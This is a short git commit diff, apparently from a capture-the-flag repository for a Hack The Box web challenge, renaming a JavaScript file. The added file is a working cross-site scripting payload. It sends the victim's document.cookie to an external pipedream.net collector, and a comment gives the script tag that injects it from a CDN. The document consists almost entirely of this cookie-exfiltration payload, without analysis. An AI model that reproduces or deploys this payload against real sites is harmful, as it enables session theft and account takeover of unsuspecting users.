4a43160b560418a626b6ddf99b0275f147cf6dab
Mike <mdunnegan@gmail.com>
2022-11-17 07:48:38 -0500

    Update and rename cursed-secret-party-exfil2.js to cursed-secret-party-exfil3.js

--- cursed-secret-party-exfil2.js
+++
@@ -1,7 +0,0 @@
-fetch('https://en4573hddufwo.x.pipedream.net', {
-    method: 'GET',
-    credentials: 'include'
-    //other options
-});
-
-// <script src='https://cdn.jsdelivr.net/gh/mdunnegan/htb-cursed-secret-party/cursed-secret-party-exfil.js'></script>
---
+++ cursed-secret-party-exfil3.js
@@ -0,0 +1,7 @@
+fetch('https://en4573hddufwo.x.pipedream.net?'+document.cookie, {
+    method: 'GET',
+    credentials: 'include'
+    //other options
+});
+
+// <script src='https://cdn.jsdelivr.net/gh/mdunnegan/htb-cursed-secret-party/cursed-secret-party-exfil3.js'></script>
